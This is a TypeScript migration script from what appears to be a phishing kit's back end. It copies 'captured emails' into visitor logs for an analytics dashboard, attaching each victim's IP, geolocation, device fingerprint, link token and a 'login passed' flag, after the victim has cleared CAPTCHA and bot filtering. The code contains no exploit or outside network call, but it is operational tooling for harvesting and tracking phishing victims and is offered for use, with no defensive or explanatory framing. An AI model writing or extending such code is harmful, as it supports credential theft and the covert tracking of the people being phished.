/**
 * Migration script: Convert existing captured emails to visitor logs
 * This allows existing captures to appear in the analytics dashboard
 */

import { getAllCapturedEmails } from '@/lib/linkDatabase'
import { addVisitorLog } from '@/lib/visitorTracker'
import { getGeoData } from '@/lib/geoLocation'

async function migrateCapturesToVisitors() {
  console.log('🔄 Starting migration: Captures → Visitor Logs')
  
  try {
    // Get all captured emails
    const captures = await getAllCapturedEmails()
    console.log(`📊 Found ${captures.length} captured emails`)
    
    let migrated = 0
    let skipped = 0
    let errors = 0
    
    for (const capture of captures) {
      try {
        // Get geo data for the IP
        const geoData = await getGeoData(capture.ip)
        
        // Create visitor log entry
        await addVisitorLog({
          ip: capture.ip,
          userAgent: 'Unknown', // Captures don't store user agent
          country: geoData.country,
          city: geoData.city,
          captchaStatus: 'verified', // If captured, they passed CAPTCHA
          botStatus: 'human', // If captured, they're human
          fingerprint: capture.fingerprint,
          linkToken: capture.linkToken,
          email: capture.email,
          layer: 'login',
          layerPassed: true, // They successfully logged in
          sessionId: capture.fingerprint || capture.ip
        })
        
        migrated++
        if (migrated % 10 === 0) {
          console.log(`  ✅ Migrated ${migrated}/${captures.length}...`)
        }
      } catch (error) {
        console.error(`  ❌ Error migrating capture ${capture.id}:`, error)
        errors++
      }
    }
    
    console.log('')
    console.log('✅ Migration complete!')
    console.log(`   Migrated: ${migrated}`)
    console.log(`   Skipped: ${skipped}`)
    console.log(`   Errors: ${errors}`)
    console.log('')
    console.log('📊 Check the analytics dashboard to see migrated visitors')
    
  } catch (error) {
    console.error('❌ Migration failed:', error)
    process.exit(1)
  }
}

// Run migration
migrateCapturesToVisitors()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error('Fatal error:', error)
    process.exit(1)
  })




